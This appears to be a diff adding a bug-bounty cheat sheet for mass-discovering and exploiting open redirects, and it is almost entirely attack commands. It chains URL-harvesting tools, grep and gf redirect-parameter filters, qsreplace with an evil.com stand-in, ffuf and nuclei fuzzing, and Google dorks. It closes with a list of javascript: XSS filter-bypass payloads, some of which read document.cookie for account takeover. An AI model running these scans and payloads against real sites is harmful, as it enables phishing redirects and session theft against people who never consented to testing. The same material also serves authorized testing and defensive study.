@@ -1,0 +1,143 @@
+open redirection AUTOMATION
+
+
+For single domain:
+
+echo target.com | gau --o urls1.txt
+echo target.com | katana -d 2 -o urls2.txt
+echo target.com | urlfinder -o urls3.txt
+echo target.com | hakrawler > urls4.txt
+
+
+After collecting all the URLs its time to filter out duplicates and sort them.
+cat urls1.txt urls2.txt urls3.txt | uro | sort -u | tee final.txt
+
+
+Filtering URLs for Redirect Parameters
+Using the grep command to filter out all open redirect parameters used for redirections:
+cat final.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=|redirect_url=|redirect_to=|forward_to=|forward_url=|destination_url=|jump_to=|go_to=|goto_url=|target_url=|redirect_link=" | tee redirect_params.txt
+
+A more effective approach is to use the gf tool pattern to filter only open redirect parameters with the following command:
+final.txt | gf redirect | uro | sort -u | tee redirect_params.txt
+
+
+Now its time for the final exploitation phase. Lets identify potential payloads and test for successful redirections
+ cat redirect_params.txt | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
+
+Or you can also achieve same using the following method:
+subfinder -d vulnweb.com -all | httpx-toolkit -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com"
+
+It will display all the URLs that redirect to evil.com on the screen.
+
+
+to scan for all open redirect bypass payloads from my custom list use the following command:
+
+cat redirect_params.txt | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+
+
+Or you can also achieve same results using the following method for single and multiple target domains:
+
+ echo target.com -all | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+
+subfinder -d target.com -all | httpx-toolkit -silent | gau | gf redirect | uro | while read url; do cat loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+
+
+Fuzzing with FFuF and Verifying in Burpsuite
+ffuf -w redirect_params.txt:PARAM -w loxs/payloads/or.txt:PAYLOAD -u "https://site.com/bitrix/redirect.php?PARAM=PAYLOAD" -mc 301,302,303,307,308 -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0" -x http://localip:8080 -t 10 -mr "Location: http://google.com"
+
+-mc : Match only 301,302,303,307,308 redirect responses.
+-mr : Confirm redirect to a malicious domain “Location: http://google.com"
+-x: This option is used to proxy FFUF traffic through Burp Suite for manual testing.
+-w for wordlist: redirect_param.txt contains all openredirect params and or.txt file contains all openredirect bypass paylaods
+Press enter or click to view image in full size
+
+
+You can also use CURL tool for mass open redirect testing with the following command:
+
+ cat urls.txt | qsreplace "https://evil.com" | xargs -I {} curl -s -o /dev/null -w "%{url_effective} -> %{redirect_url}\n" {}
+
+
+Testing Using Nuclei Template
+You can also use this custom private Nuclei template that automatically appends parameters to subdomain URLs and checks for open redirects.
+
+echo subdomains.txt | nuclei -t openRedirect.yaml -c 30
+
+Using virustotal
+You can also use VirusTotal to find URLs with open redirect parameters and test them with the above methods.
+
+https://www.virustotal.com/vtapi/v2/domain/report?apikey=<api_key>&domain=target.com
+
+./virustotal.sh domains.txt | gf redirect
+
+After this you can use the same methods like qsreplace,ffuf,httpx and Burp Suite for further testing.
+
+
+Using Loxs tool
+For a simpler way to find open redirects you can use our Loxs tool which automatically detects open redirects without any false positives. Use the following command first:
+
+cat urls.txt | sed 's/=.*/=/' | uro >final.txt
+urls.txt: A file containing URLs that have been filtered and sorted using gf patterns or other methods.
+The sed command is used to extract all parameters from URLs and convert them into empty parameters for fuzzing.
+After this send the final.txt file into the Loxs tool, select the open redirect option, choose the urls.txt file and select the payload file after that The result will look like this:
+
+Openredirect to XSS(ATO)
+If you find any open redirect, always try to increase the impact by chaining it with XSS by using following paylaods:
+
+#Basic payload, javascript code is executed after "javascript:"
+javascript:alert(1)
+
+#Bypass "javascript" word filter with CRLF
+java%0d%0ascript%0d%0a:alert(0)
+
+#Javascript with "://" (Notice that in JS "//" is a line coment, so new line is created before the payload). URL double encoding is needed
+#This bypasses FILTER_VALIDATE_URL os PHP
+javascript://%250Aalert(1)
+
+#Variation of "javascript://" bypass when a query is also needed (using comments or ternary operator)
+javascript://%250Aalert(1)//?1
+javascript://%250A1?alert(1):0
+
+#Others
+%09Jav%09ascript:alert(document.domain)
+javascript://%250Alert(document.location=document.cookie)
+/%09/javascript:alert(1);
+/%09/javascript:alert(1)
+//%5cjavascript:alert(1);
+//%5cjavascript:alert(1)
+/%5cjavascript:alert(1);
+/%5cjavascript:alert(1)
+javascript://%0aalert(1)
+<>javascript:alert(1);
+//javascript:alert(1);
+//javascript:alert(1)
+/javascript:alert(1);
+/javascript:alert(1)
+\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
+javascript:alert(1);
+javascript:alert(1)
+javascripT://anything%0D%0A%0D%0Awindow.alert(document.cookie)
+javascript:confirm(1)
+javascript://https://whitelisted.com/?z=%0Aalert(1)
+javascript:prompt(1)
+jaVAscript://whitelisted.com//%0d%0aalert(1);//
+javascript://whitelisted.com?%a0alert%281%29
+/x:1/:///%01javascript:alert(document.cookie)/
+
+
+Google Dorking & Automation
+You can also use the manual method to find open redirects on your target using this Google Dork:
+
+site:target (inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= | inurl:dest= | inurl:target= | inurl:redirect_uri= | inurl:redirect_url= | inurl:checkout_url= | inurl:continue= | inurl:return_path= | inurl:returnTo= | inurl:out= | inurl:go= | inurl:login?to= | inurl:origin= | inurl:callback_url= | inurl:jump= | inurl:action_url= | inurl:forward= | inurl:src= | inurl:http | inurl:&)
+inurl:url= | inurl:return= | inurl:next= | inurl:redirect= | inurl:redir= | inurl:ret= | inurl:r2= | inurl:page= inurl:& inurl:http site:target
+For mass open redirect automation, you can use my dorking.py script, which fetches all Google Dork results within seconds on the terminal
+
+
+After this use gf patterns,qsreplace and httpx grep to filter valid open redirects with the following command:
+
+cat urls.txt| gf redirect | uro | qsreplace "https://evil.com" | httpx-toolkit -silent -fr -mr "evil.com" 
+
+For testing more advanced bypass payloads rather than simple ones use this command to try all bypass payloads from my custom wordlist:
+
+cat urls.txt| gf redirect | uro | while read url; do cat /home/coffinxp/loxs/payloads/or.txt | while read payload; do echo "$url" | qsreplace "$payload"; done; done | httpx-toolkit -silent -fr -mr "google.com"
+
+
